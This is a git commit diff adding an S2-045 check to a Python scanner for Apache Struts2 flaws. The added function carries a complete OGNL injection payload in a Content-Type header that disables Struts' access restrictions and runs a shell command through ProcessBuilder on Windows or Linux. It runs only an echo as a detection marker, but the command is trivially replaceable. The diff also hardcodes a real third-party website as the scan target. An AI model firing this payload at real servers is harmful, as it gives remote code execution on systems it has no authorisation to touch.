b48090a64e299874ab424d042b7633900f626713
jasonsheh <qq3039344@gmail.com>
2017-03-31 19:11:55 +0800

    add st2-045

--- lib/struts2.py
+++ lib/struts2.py
@@ -94,8 +94,31 @@ class Struts2:
             return None
         return None
 
+    def struts2_045(self):
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko)"
+                          " Chrome/56.0.2924.87 Safari/537.36",
+            "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_mem"
+                            "berAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.Action"
+                            "Context.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl"
+                            ".OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExclud"
+                            "edClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo webpath:').(#iswi"
+                            "n=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=("
+                            "#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuil"
+                            "der(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache."
+                            "struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons."
+                            "io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
+        try:
+            resp = requests.get(self.url, headers=headers)
+            if "webpath:" in resp.text:
+                return "s2-045"
+        except:
+            return None
+        return None
+
     def struts2(self):
-        r = self.struts2_013() or self.struts2_016() or self.struts2_019() or self.struts2_032() or self.struts2_037()
+        r = self.struts2_013() or self.struts2_016() or self.struts2_019() or self.struts2_032() or self.struts2_037()\
+            or self.struts2_045()
         if r:
             print('存在漏洞: %s : %s' % (r, self.url))
 
@@ -107,7 +130,7 @@ class Struts2:
                 self.struts2()
 
     def main(self):
-        self.url = input("请输入网址: ")
+        self.url = 'https://butian.360.cn/srcNav'
         self.struts2()
 
 if __name__ == '__main__':
